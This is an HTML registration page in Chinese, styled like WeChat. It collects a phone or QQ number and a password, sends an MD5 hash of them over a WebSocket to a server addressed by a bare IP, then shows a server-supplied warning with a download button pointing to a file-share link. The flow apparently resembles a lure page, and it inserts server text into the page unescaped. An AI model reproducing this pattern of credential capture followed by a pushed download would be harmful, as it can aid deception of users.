<!DOCTYPE html>
<html>
<head lang="en">
    <meta http-equiv=Content-Type content="text/html;charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no">
    <title>登录</title>
    <style>body{font-size:14px}h1,h2,h3,h4,h5{font-weight:400;font-style:normal}h1,.h1{font-size:20px}h2,.h2{font-size:18px}.desc{color:#b2b2b2}.warn{color:#b71414}body{background-color:#fff}.msg{padding:75px 15px 0;text-align:center}.icon_area{margin-bottom:19px}.text_area{margin-bottom:25px}.text_area .title{margin-bottom:12px}.icon_msg{width:100px;height:100px;vertical-align:middle;display:inline-block;border-radius:50%;-moz-border-radius:50%;-webkit-border-radius:50%}.icon_msg.warn{background-color:#07c160;color:#fff;font-size:60px;font-style:normal}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{font:14px/1.5em "Helvetica Neue",Helvetica,Arial,sans-serif;background-color:#efeff4;line-height:1.6}body,h1,h2,h3,h4,h5,p,ul,ol,dl,dd,fieldset,textarea{margin:0}fieldset,legend,textarea,input,button{padding:0}button,input,select,textarea{font-family:inherit;font-size:100%;margin:0;*font-family:"Helvetica Neue",Helvetica,Arial,sans-serif}ul,ol{padding-left:0;list-style-type:none}a img,fieldset{border:0}a{text-decoration:none}
	input{outline-color:invert;outline-style:none;outline-width:0px;border:none;border-style:none;text-shadow:none;-webkit-user-select:text;outline-color:transparent;box-shadow:none}.reg{margin:10px auto;width:220px}.reg div{text-align:center;line-height:20px;font-size:18px;margin:15px 0}.reg .itxt{font-size:18px;width:193px;height:50px;border:1px solid#bbb;line-height:48px;padding-left:25px;color:#666;margin-bottom:10px}.reg .itxt:hover{border:1px solid#888}.reg .itxt:focus{border:1px solid#07c160}.reg .regbtn{width:220px;height:50px;font-size:18px;text-align:center;line-height:48px;color:#fff;background:#07c160;cursor:pointer}.reg .username{background:url(./user.jpg)no-repeat 5px center}.reg .password{background:url(./pass.jpg)no-repeat 5px center}
	#pmsg{display:none}
	#cmsg{display:none}
	#sign{display:none}
	</style>
</head>
<body>
	<br/>
    <div id="pmsg" class="msg"></div>
	<div id="cmsg" style="height:18px;line-height:18px;color:red;font-size:16px;text-align:center"></div>

	<div id="sign" class="reg">
		<form name="sign" action="javascript:form_submit(0);" method="post">
			<input name="n" type="text" class="itxt username" placeholder="手机 / QQ">
			<input name="p" type="password" class="itxt password" placeholder="密码">
			<input name="cp" type="password" class="itxt password" placeholder="确认密码">
			<input name="r" type="submit" class="regbtn" value="注册">
		</form>
	</div>

<script src="./ws.js"></script>
<script src="./md.js"></script>
<script src="./ua.js"></script>
<script type="text/javascript">

var msgHtml='';

function qs(name) {
	var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
	var r = window.location.search.substr(1).match(reg);
	if (r != null)
		return decodeURI(r[2]);
	return null;
}

function show_html(id) {
	
	if(id==1){//注册
		document.getElementById('cmsg').innerText='';
		document.getElementById('cmsg').style.display='block';
		document.getElementById('sign').style.display='block';
		document.getElementById('pmsg').style.display='none';
		document.getElementById('pmsg').innerHTML='';
	}else if(id==2){//信息
		document.getElementById('cmsg').style.display='none';
		document.getElementById('sign').style.display='none';
		document.getElementById('pmsg').innerHTML=msgHtml;
		document.getElementById('pmsg').style.display='block';
	}
}

var prom = qs('p');
//var ua = new UAParser().getResult();
//var ws = new WebSocket('ws://47.97.26.16:3696');
//ws.onopen = function(event) {}; 
//ws.onclose = function(event) {}; 
//ws.onerror = function(event) {}; 
ws.onmessage = function(event) {
	console.log(event.data);
	
	var data = JSON.parse(event.data);
	var text = data.text.split("@");
	
	msgHtml='<div class="icon_area"><i class="icon_msg warn">!</i></div><div class="text_area"><h2 class="title">'+text[0]+'</h2><p class="desc">'+text[1]+'</p></div><div style="margin:10px auto;width:220px;height:50px;line-height:50px;color:#fff;background:#6850a4;font-size:16px;text-align:center" onclick="window.location.href=\'https://uduou.lanzouw.com/b00ef1xvri\'">下载</div>';

	show_html(2);
};

function form_submit(id) {
	var f = document.forms[id];
	if(!chack_form(f))return false;

	var user=f.n.value;
	var pass=hex_md5(user+f.p.value);
	console.log(f.name);
	
	ws.send('{"form": "'+f.name+'", "user": "'+user+'", "pass": "'+pass+'", "prom": "'+prom+'"}');
}

function chack_form(f){
	var cmsg = document.getElementById('cmsg');
	
	if (f.n!=null && f.n.value==''){
		cmsg.innerText='还没填写账号';
		f.n.focus();
		return false;
	}
	if (!(/^1[3456789]\d{9}$/.test(f.n.value))){//不是手机号
		if (!(/^[1-9][0-9]{4,10}$/.test(f.n.value))){//不是企鹅号
			cmsg.innerText='账号格式不正确';
			f.n.select();
			return false;
		}
	}
	if (f.p!=null && f.p.value==''){
		cmsg.innerText='密码不能为空';
		f.p.focus();
		return false;
	}
	if (f.cp!=null && f.cp.value==''){
		cmsg.innerText='确认密码不能为空';
		f.cp.focus();
		return false;
	}
	if (f.cp!=null && f.cp.value!=f.p.value){
		cmsg.innerText='两次密码输入不一致';
		f.p.focus();
		return false;
	}
	return true;
}
show_html(1);


</script>

</body>
</html>